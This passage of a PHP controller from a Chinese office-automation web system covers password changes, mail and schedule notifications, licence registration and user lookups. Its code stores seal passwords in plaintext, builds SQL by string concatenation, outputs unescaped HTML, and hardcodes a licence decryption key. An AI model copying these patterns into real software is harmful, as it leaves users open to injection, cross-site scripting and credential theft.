			$this->success('密码修改成功！');
         }
		 */
		$this->checkUser();
        //对表单提交处理进行处理或者增加非表单数据
		if(md5($_POST['verify'])	!= $_SESSION['verify']) {
			$this->error('验证码错误！');
		}
		$map	=	array();
        $map['password']= pwdHash($_POST['oldpassword']);
        if(isset($_POST['account'])) {
            $map['account']	 =	 $_POST['account'];
        }elseif(isset($_SESSION[C('USER_AUTH_KEY')])) {
            $map['id']		=	$_SESSION[C('USER_AUTH_KEY')];
        }
        //检查用户
        $User    =   M("User");
        if(!$User->where($map)->field('id')->find()) {
            $this->error('旧密码不符或者用户名错误！');
        }else {
			$User->password	=	pwdHash($_POST['password']);
			$User->save();
			$this->redirect('Index/index');
        }
    }
	
	
	public function passwordseal()
	{
		$mapforEsp[user]=$_SESSION[name];
		$sealinfo=M("Esp")->where($mapforEsp)->find();
		$this->assign('sealinfo',$sealinfo);
		$this->display();
	}
	public function changePwdseal()
    {
		$this->checkUser();
        //对表单提交处理进行处理或者增加非表单数据
		if(md5($_POST['verify'])	!= $_SESSION['verify']) {
			$this->error('验证码错误！');
		}
		if($_POST['password'] != $_POST['repassword'])
		{
			$this->error('两次输入的密码不一致！');
		}
		
		$map	=	array();
        $map['password']= $_POST['oldpassword'];
        $map['user']		=	$_SESSION[name];
        //检查用户
        $User    =   M("Esp");
        if(!$User->where($map)->field('id')->find()) {
            $this->error('旧印章密码不符！');
        }else {
			$User->password	=	$_POST['password'];
			$User->save();
			$this->success('印章密码修改成功！');
         }
    } 
    public function changePwddoc()
    {
    	$this->checkUser();
    	//对表单提交处理进行处理或者增加非表单数据
    	if(md5($_POST['verify'])	!= $_SESSION['verify']) {
    		$this->error('验证码错误！');
    	}
    	$map	=	array();
    	$map['password']= pwdHash($_POST['oldpassword']);
    	//检查用户
    	$User    =   M("Passworddoc");
    	if(!$User->where($map)->field('id')->find()) {
    		$this->error('旧密码不符！');
    	}else {
    		$User->password	=	pwdHash($_POST['password']);
    		$User->save();
    		$this->success('公文密码修改成功！');
    	}
    }
	
	public function profile() {
		$this->checkUser();
		$User	 =	 M("User");
		$vo	=	$User->getById($_SESSION[C('USER_AUTH_KEY')]);
		$this->assign('vo',$vo);
		
		$relativerole=M("relativerole");		
		$mapx['roleid']=$_SESSION['position'];
		$mapx['code']='material';
		$findret=$relativerole->where($mapx)->find();
		if($findret!=null)
		{
			$this->assign('materialrole',1);
			$userfiles=M("userfiles");
			$logo=$userfiles->where("id='" . $vo['id'] . "'")->getField('image'); 
			$this->assign('logo',$logo);	
		}
		
		$this->display();
	}
	
	public function panel() {
		$mapwidget[number]=$_SESSION['number'];
    	$widget=D("Main")->where($mapwidget)->select();
    	$this->assign('widget',$widget[0]);
		$this->display();
	}
	public function verify()
    {
		$type	 =	 isset($_GET['type'])?$_GET['type']:'gif';
        import("@.ORG.Util.Image");
        Image::buildImageVerify(4,1,$type);
    }
	// 修改资料
	public function change() {
		$this->checkUser();
		$User	 =	 D("User");
		if(!$User->create()) {
			$this->error($User->getError());
		}
		$result	=	$User->save();
		if(false !== $result) {
			$this->success('资料修改成功！');
		}else{
			$this->error('资料修改失败!');
		}
	}
		
	public function schedule() {
		$name = "Schedule";
		$model = M($name);
		$condition[user]=1;
		$condition[status]=1;
		$vo = $model->where($condition)->select();		
		$this->ajaxReturn(count($vo),'',1);
	}
	
	public function delschedule() {
		$name = "Schedule";
		$model = M($name);
		$condition['id']=$_REQUEST ['content'];
		$data['status']=0;
		//$condition['id'] = $model->where($condition)->getField('id');
		$model->where($condition)->setField($data);
		//$this->ajaxReturn($condition['create_time'],'',1);
		//$model->add($data);
		//$this->success("chenggong");
		//$this->ajaxReturn($data['status'],'',1);
	}
	
	public function scheduledata() {
		$name = "Schedule";
		$model = M($name);
		$condition[user]=1;
		$condition[status]=1;
		$vo = $model->where($condition)->select();
		//$this->ajaxReturn($vo,'',1);
		foreach ($vo as $key=>$val)
		{
			$data.=$vo[$key][content].'^&*'.date('Y年m月d日 H:i:s',$vo[$key][create_time]).'%^&'.$vo[$key][href].'@%&';
		}
		$this->ajaxReturn($data,'',1);
	}
	
	public function findmyshedule()
	{
		if(empty($_SESSION["id"]))
		{
			return;
		}
		$name = "Sendmail";
		$model = M($name);
		$time=time()-120;
		$time1=date('Y年m月d日 H:i:s',$time);
		$condition="receiver_waste NOT LIKE ".'"'."%".'['.$_SESSION['number'].']'."%".'"'
		." AND receiver_waste NOT LIKE ".'"'."%"."{".$_SESSION['number']."}"."%".'"'."
    	AND (receiver LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'
		." OR copy LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'.")"
		." AND (create_time >".$time.")"." AND (update_time NOT LIKE ".'"'."%[".$_SESSION['number']."]%".'"'.")";
		
		$conditionmail="receiver_waste NOT LIKE ".'"'."%".'['.$_SESSION['number'].']'."%".'"'
				." AND receiver_waste NOT LIKE ".'"'."%"."{".$_SESSION['number']."}"."%".'"'."
    	AND (receiver LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'
		    			." OR copy LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'.")"
		    					." AND (commit_time NOT LIKE ".'"'."%[".$_SESSION['number']."]%".'"'.")";
		$countmail = $model->where($conditionmail)->count('id');
		//$this->assign('countmail',$countmail);
		
		$vo = $model->where($condition)->select();
		
		$mysheduledata=$countmail."~!@#$";
		
		$flag='0';
		/*其实原来的方法也行，查两分钟之内没有提示过的，一般都不会两分钟之内有多封邮件，除了注册通知*/
		foreach ($vo as $key=>$val)
		{
			if($vo[$key][title]!=NULL)
			{
				$vo[$key][update_time].='['.$_SESSION['number'].']';
				$model->save($vo[$key]);
				$flag="1";
			}
		}
		$mysheduledata.=$flag;
		/*
		if($vo[0][title]!=NULL)
		{
			$vo[0][update_time].='['.$_SESSION['number'].']';
			$model->save($vo[0]);
			$mysheduledata.='1';
		}
		else
		{
			$mysheduledata.='0';
		}
		*/
		//查找同级别所有人
		$mapForUser["position"]=$_SESSION["position"];
		if($_SESSION["projecttype"]=="")
		{
			
		}
		else
		{
			$conditionschedule["projecttype"]=array("in",$_SESSION["projecttype"]);
		}
		$users_on_mylevel_array=M("User")->where($mapForUser)->field("nickname,number")->select();
		foreach ($users_on_mylevel_array as $key=>$val)
		{
			$users_on_mylevel.=$val["nickname"].$val["number"].",";
		}
		
		
		
		$nameschedule = "Schedule";
		$modelschedule = M($nameschedule);
		$conditionschedule[status]=1;
		$conditionschedule[user]=array('like','%'.$_SESSION['loginUserName'].$_SESSION['number'].'%');
		//$conditionschedule[user]=array('in',$users_on_mylevel);
		$voschedule = $modelschedule->where($conditionschedule)->limit(5)->order('create_time desc')->select();/*按时间排序*/
		$voschedulecount=$modelschedule->where($conditionschedule)->count();
		//$this->ajaxReturn(count($vo),'',1);
		$mysheduledata.=$voschedulecount.'@#$%^';

		//$this->ajaxReturn($vo,'',1);
		foreach ($voschedule as $key=>$val)
		{
			//$mysheduledata.=$voschedule[$key][id].'@!#'.$voschedule[$key][content].'^&*'.date('Y年m月d日 H:i:s',$voschedule[$key][create_time]).'%^&'.$voschedule[$key][href].'@%&';
			
			$mysheduledata.='<li>
								<a href="'.$val[href].'/plmid/'.$val['taskid'].'/" class="J_menuItem schedule_a" data-index="0" title="待办事项">
									<div>
										<i class="fa fa-envelope fa-fw"></i> '.$val[content].'
										<span class="pull-right text-muted small">'.date('m-d H:i',$val['create_time']).'</span>
									</div>
								</a>
							</li>
							<li class="divider"></li>';
		}
		$mysheduledata.='<li>
			<div class="text-center link-block">
				<a class="J_menuItem schedule_a" href="index.php?s=Schedule/index/">
					<strong>查看所有消息</strong>
					<i class="fa fa-angle-right"></i>
				</a>
			</div>
		</li>';
		
		
		$this->ajaxReturn($mysheduledata,'',1);
		
	}
	
	
	public function findmyshedulecount()
	{
		if(empty($_SESSION["id"]))
		{
			$this->ajaxReturn(0,'',1);
		}
		
		//查找同级别所有人
		$mapForUser["position"]=$_SESSION["position"];
		$users_on_mylevel_array=M("User")->where($mapForUser)->field("nickname,number")->select();
		foreach ($users_on_mylevel_array as $key=>$val)
		{
			$users_on_mylevel.=$val["nickname"].$val["number"].",";
		}
		if($_SESSION["projecttype"]=="")
		{
			
		}
		else
		{
			$conditionschedule["projecttype"]=array("in",$_SESSION["projecttype"]);
		}
		
		$nameschedule = "Schedule";
		$modelschedule = M($nameschedule);
		$conditionschedule[status]=1;
		$conditionschedule[user]=array('like','%'.$_SESSION['loginUserName'].$_SESSION['number'].'%');
		//$conditionschedule[user]=array('in',$users_on_mylevel);
		$count = $modelschedule->where($conditionschedule)->count();
		$this->ajaxReturn($count,'',1);
	}
	
	public function getScheduleData()
	{
		$nameschedule = "Schedule";
		$modelschedule = M($nameschedule);
		$conditionschedule[status]=1;
		$conditionschedule[user]=array('like','%'.$_SESSION['loginUserName'].$_SESSION['number'].'%');
		//$conditionschedule[user]=array('in',$users_on_mylevel);
		$voschedule = $modelschedule->where($conditionschedule)->limit(10)->order('create_time desc')->select();/*按时间排序*/
		$voschedulecount=$modelschedule->where($conditionschedule)->count();
		
		foreach($voschedule as $i => $val)
        {
	       
			if($voschedule[$i][create_time]>time()-1*24*60*60)
			{	
				$voschedule[$i][title1]=PublicAction::g_substr_mail($voschedule[$i][content]).'&nbsp;<img src="../Public/Images/icons/new.gif"/></img>';
			}
			else
			{
				$voschedule[$i][title1]=PublicAction::g_substr_mail($voschedule[$i][content]);
			}	
        }
		$mysheduledata="";
		foreach ($voschedule as $key=>$val)
		{
			
			$mysheduledata.='<div class="feed-element"><div><small class="pull-right text-navy"></small><div style="line-height:22px"><a href="'.$val["href"].'" style="color:#666">'.$val["title1"].'</a></div><small class="text-muted">'.date('Y-m-d H:i:s',$val['create_time']).'</small></div></div>';
		}
		
		$this->ajaxReturn($mysheduledata,'',1);
	}	
		
	public function getEmailData()
	{
		$name = "Sendmail";
        $model = D($name);
        
		$condition="receiver_waste NOT LIKE ".'"'."%".'['.$_SESSION['number'].']'."%".'"'
		." AND receiver_waste NOT LIKE ".'"'."%"."{".$_SESSION['number']."}"."%".'"'."
    	AND (receiver LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'
		." OR copy LIKE ".'"'."%".$_SESSION['loginUserName'].$_SESSION['number'].","."%".'"'.")"
		." AND (commit_time NOT LIKE ".'"'."%[".$_SESSION['number']."]%".'"'.")";
		
        $datamail1 = $model->where($condition)->order('create_time desc')->limit(10)->select();
         
        foreach($datamail1 as $i => $val)
        {
	        if($datamail1[$i][title]!=null)
	        {
	        	if($datamail1[$i][create_time]>time()-1*24*60*60)
	        	{	
		        	$datamail[$i][title1]=PublicAction::g_substr_mail($datamail1[$i][title]).'&nbsp;<img src="../Public/Images/icons/new.gif"/></img>';
	        	}
	        	else
	        	{
					$datamail[$i][title1]=PublicAction::g_substr_mail($datamail1[$i][title]);
	        	}	
		        $datamail[$i][create_time]=$datamail1[$i][create_time];
				$datamail[$i][id]=$datamail1[$i][id];
		        
	        }
	        else
	        {
	        	$datamail[$i][title1]="&nbsp;";
	        }
        }
		
		
		foreach($datamail as $i => $vo)
        {
			
			$html.='<div class="feed-element">
				<div>
					<small class="pull-right text-navy"></small>
					<strong>'.$vo[sender].'</strong>
					<div style="line-height:22px">'.$vo["title1"].'</div>
					<small class="text-muted">'.date("Y-m-d H:i:s",$vo["create_time"]).'</small>
				</div>
			</div>';
		}					

       $this->ajaxReturn($html,'',1);
	}
	
	
	
	public function register()
	{
		$modelmachine = D('Machine');
		$this->assign("machine",$modelmachine->getField('machine'));
		$this->display();
	}
	public function reg_trial_submit()
	{
		if($_FILES["REGISTER_FILE"]["name"]!="office.oa")
		{
			$this->error('注册失败，请检查您的授权文件!');
		}		
		$this->_upload();
		$modelmachine = D('Machine');
		$machine['machine']     =   $modelmachine->getField('machine');
		$local=$machine['machine'];
		$fp = fopen($_SERVER['DOCUMENT_ROOT'].'/OA/Public/eWebEditor/sysimage/file/ground.gif','r');
		$contents = fread ($fp, filesize ($_SERVER['DOCUMENT_ROOT'].'/OA/Public/eWebEditor/sysimage/file/ground.gif'));
		$out=$this->decrypt(base64_decode($contents),'MyOaSecret');
		
		if($local==$out)
		{
			$this->success('注册成功，您可以放心使用OA产品,同时请保留您的授权文件!');
		}
		else
		{
			$this->error('注册失败，请检查您的授权文件!');
		}
	}
	Public function _upload(){
		import("ORG.Net.UploadFile");
		$upload = new UploadFile();// 实例化上传类
		$upload->maxSize  = 20*1024*1024 ;// 设置附件上传大小
		$upload->savePath =  '../Public/eWebEditor/sysimage/file/';// 设置附件上传目录
		$pathinfo = pathinfo($_FILES["REGISTER_FILE"]["name"]);
		$upload->saveRule = "ground";
		$upload->uploadReplace = true;
		if(!$upload->upload()) {// 上传错误提示错误信息
			$this->error($upload->getErrorMsg());
		}else{// 上传成功 获取上传文件信息
			$info =  $upload->getUploadFileInfo();
			unlink("../Public/eWebEditor/sysimage/file/ground.gif");
			rename("../Public/eWebEditor/sysimage/file/ground.oa","../Public/eWebEditor/sysimage/file/ground.gif");
		}
		return $info[0][savename];
	}
	
	Public function science(){
		$User=M("User");
		$map['number']=$_SESSION['number'];
		$User->where($map)->setField('skin','1');
		$_SESSION['skin']	=	1;
		$this->ajaxReturn(1,'换肤成功',1);
	}
	Public function blue(){
		$User=M("User");
		$map['number']=$_SESSION['number'];
		$User->where($map)->setField('skin','0');
		$_SESSION['skin']	=	0;
		$this->ajaxReturn(0,'换肤成功',1);
	}
	Public function normal(){
		$User=M("User");
		$map['number']=$_SESSION['number'];
		$User->where($map)->setField('skin','2');
		$_SESSION['skin']	=	2;
		$this->ajaxReturn(0,'换肤成功',1);
	}	
	Public function classic(){
		$User=M("User");
		$map['number']=$_SESSION['number'];
		$User->where($map)->setField('skin','3');
		$_SESSION['skin']	=	3;
		$this->ajaxReturn(0,'换肤成功',1);
	}
	public function select()
	{
		 
		//$map = $this->_search();
		//创建数据对象
		$this->assign('arg1', $_GET[arg1]);
		$this->assign('arg2', $_GET[arg2]);
		$Group = D('User');
		//查找满足条件的列表数据
		$user    = $Group->field('id,nickname,number,department,position')->select();
		foreach ($user as $key=>$val)
		{
			$user[$key][namenumber]=$val[department].'.'.$val[nickname].$val[number].'.'.$val[position];
			$userdept.=$user[$key][namenumber].',';
		}
		$this->assign('user',$user);
		 
		//$userdept='a.b';
		$this->assign('userdept',$userdept);
	
		$Group = D('Dept');
		//查找满足条件的列表数据
		$dept     = $Group->field('id,name')->select();
		$this->assign('dept',$dept);
	
		$Group = D('Role');
		//查找满足条件的列表数据
		$role     = $Group->field('id,name')->select();
		$this->assign('role',$role);
		 
		$this->display();
		 
		return;
	}
	
	public function selectmulti()
	{			
		//$map = $this->_search();
		//创建数据对象
		
		$this->assign('arg1', $_GET[arg1]);
		$this->assign('arg2', $_GET[arg2]);
		$Group = D('User');
		//查找满足条件的列表数据
		$user    = $Group->field('id,nickname,number,department,position')->select();
		foreach ($user as $key=>$val)
		{
			$user[$key][namenumber]=$val[department].'.'.$val[nickname].$val[number].'.'.$val[position];
			$userdept.=$user[$key][namenumber].',';
		}
		$this->assign('user',$user);
			
		//$userdept='a.b';
		$this->assign('userdept',$userdept);
	
		$Group = D('Dept');
		//查找满足条件的列表数据
		$dept     = $Group->field('id,name')->select();
		$this->assign('dept',$dept);
	
		$Group = D('Role');
		//查找满足条件的列表数据
		$role     = $Group->field('id,name')->select();
		$this->assign('role',$role);			
		$this->display();
			
		return;
	}
	
	
	public function selectworker()
	{
			
		//$map = $this->_search();
		//创建数据对象
		$this->assign('arg1', $_GET[arg1]);
		$this->assign('arg2', $_GET[arg2]);
		$Group = D('User');
		//查找满足条件的列表数据
		$user    = $Group->field('id,nickname,number,department,position')->select();
		foreach ($user as $key=>$val)
		{
			$user[$key][namenumber]=$val[department].'.'.$val[nickname].$val[number].'.'.$val[position];
			$userdept.=$user[$key][namenumber].',';
		}
		$this->assign('user',$user);
			
		//$userdept='a.b';
		$this->assign('userdept',$userdept);
	
		$Group = D('Dept');
		//查找满足条件的列表数据
		$dept     = $Group->field('id,name')->select();
		$this->assign('dept',$dept);
	
		$Group = D('Role');
		//查找满足条件的列表数据
		$role     = $Group->field('id,name')->select();
		$this->assign('role',$role);
			
		$this->display();
			
		return;
	}
	
	public function savemain()
	{
		$main =	D("Main");
		$map[number]=$_SESSION['number'];
		
		for($j=1; $j <= 12; $j++)
		{
			$data[$j]=1;
		}
		
		if(!empty($_POST["t1"])){
			$array = $_POST["t1"];
			$size = count($array);
			for($i=0; $i< $size; $i++){
				//echo $array[$i]."</br>";
				$data[$array[$i]]=0;
			}
		}
		$data[number]=$_SESSION['number'];
		$list=$main->where($map)->getField('id');
		if($list==false)
			$main->add($data);
		else
		{
			$data[id]=$list;
			$main->save($data);
		}
		if($_SESSION[skin]!=3)
		{
			$this->success("配置成功，请刷新页面！");
		}
		else
		{	
			$this->main();
		}
		
	}
	/*查找所有部门，查找所有职位*/
	function OrgLookupold()
	{
		$map['name']=array("neq","车间");
		$Group = D('Dept');
		//查找满足条件的列表数据
		$dept     = $Group->where($map)->order("id")->field('id,name')->select();
		$this->assign('dept',$dept);
		
		
		
		
		
		$Group = D('User');
		$user     = $Group->order("number")->field('id,department,nickname,number')->select();
		$this->assign('user',$user);
		
		$this->display(treeLookup);
	}
	
	
	function treeLookupx()
	{
		$map['name']=array("neq","车间");
		$Group = D('Dept');
		//查找满足条件的列表数据
		$dept     = $Group->where($map)->order("id")->field('id,name')->select();
		$this->assign('dept',$dept);

		$Group = D('User');
		$user     = $Group->order("number")->field('id,department,nickname,number')->select();
		$this->assign('user',$user);
		
		$this->display();
	}
	/**************************************试用版本**************************************/
	
	public function triallogin()
	{
		$this->ajaxReturn('登录成功！','登录成功！',1);
	}
	public function trial()
	{
		if(isset($_SESSION[C('USER_AUTH_KEY')])) {
			unset($_SESSION[C('USER_AUTH_KEY')]);
			unset($_SESSION);
			session_destroy();
		}
		$this->display();
	}
	
	
	
	
	public function treeLookupmultiiframe()
	{
		$this->assign('responseList',$_REQUEST["responseList"]);
		$this->assign('pid1',$_REQUEST["pid1"]);
		$this->display();
	}
	public function treeLookupiframe()
	{
		$this->assign('responseList',$_REQUEST["responseList"]);
		$this->assign('pid1',$_REQUEST["pid1"]);
		$this->display();
	}
	
	/*查找所有部门，查找所有职位*/
	function OrgLookup()
	{
		$map['name']=array("neq","车间");
		$Group = D('Dept');
		//查找满足条件的列表数据
		$dept     = $Group->where($map)->order("id")->field('id,name')->select();
		$this->assign('dept',$dept);
		
		
		
		$Group = D('User');
		if($_REQUEST["ab"])
		{
			$mapforuser['ab|nickname'] =array(array("like","%".$_REQUEST["ab"]."%"),array("like","%".$_REQUEST["ab"]."%"),'_multi'=>true);
		}
		$mapforuser[status]=1;
		$user     = $Group->where($mapforuser)->order("number")->field('id,department,nickname,number,position')->select();
		foreach ($user as $key=>$val)
		{
			$user[$key][role]=M("Role")->where("id=".$val[position])->getField("name");
		}
		$this->assign('user',$user);
		
		
		$this->assign('responseList',$_REQUEST["responseList"]);
		$this->assign('pid1',$_REQUEST["pid1"]);
		
		$this->display(treeLookup);
	}
	
	function OrgLookupmulti()
	{
		$map['name']=array("neq","车间");
		$Group = D('Dept');
		//查找满足条件的列表数据
		$dept     = $Group->where($map)->order("id")->field('id,name')->select();
		$this->assign('dept',$dept);

		$Group = D('User');
		$mapforuser[status]=1;
		$user     = $Group->where($mapforuser)->order("number")->field('id,department,nickname,number,position')->select();
		foreach ($user as $key=>$val)
		{
			$user[$key][role]=M("Role")->where("id=".$val[position])->getField("name");
		}
		$this->assign('user',$user);
		
		
		$this->assign('responseList',$_REQUEST["responseList"]);
		$this->assign('pid1',$_REQUEST["pid1"]);
		
		$this->display(treeLookupmulti);
	}
}
?>